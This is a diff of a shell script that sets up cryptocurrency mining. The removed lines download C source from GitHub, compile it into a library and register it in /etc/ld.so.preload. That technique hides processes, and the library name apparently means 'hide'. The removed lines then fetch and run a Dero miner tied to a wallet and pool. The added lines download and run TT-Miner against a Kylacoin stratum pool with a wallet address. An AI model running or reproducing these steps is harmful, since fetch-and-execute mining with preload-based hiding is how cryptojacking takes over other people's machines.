@@ -1,13 +1,9 @@
-#!/bin/bash
-apt-get update ; apt-get install sudo -y
-curl https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c
-apt-get install build-essential -y
-gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
-mv libnyumput.so /usr/local/lib/
-echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
-rm nyumput.c
-echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
-/etc/init.d/network restart
-wget https://github.com/hasmenkuy99/files/raw/main/astorold
-chmod +x astorold
-./astorold -w dero1qy2nrm9xhj8ha2rg0qjmh39p4sdy8sycf7my49axs26x7yukfpyquqgfsz5ey.$(shuf -n 1 -i 1-99999)-AA -r fastpool.xyz:10300
+#!/bin/sh
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+apt install curl libssl1.0-dev
+apt install libjansson-dev libjansson4 -y
+wget https://github.com/TrailingStop/TT-Miner-release/releases/download/2024.3.2/TT-Miner-2024.3.2.tar.gz
+tar xvf TT-Miner-2024.3.2.tar.gz
+cd TT-Miner-2024.3.2
+chmod +x TT-Miner
+./TT-Miner -a Flex -o stratum+tcp://kylacoin.cedric-crispin.com:4374 -u kc1qg97pwtnf6jszasdhml9xt4wfu02vyxjvw0vkpm.$(echo $(shuf -i 1000-9999 -n 1)-NN) -p x
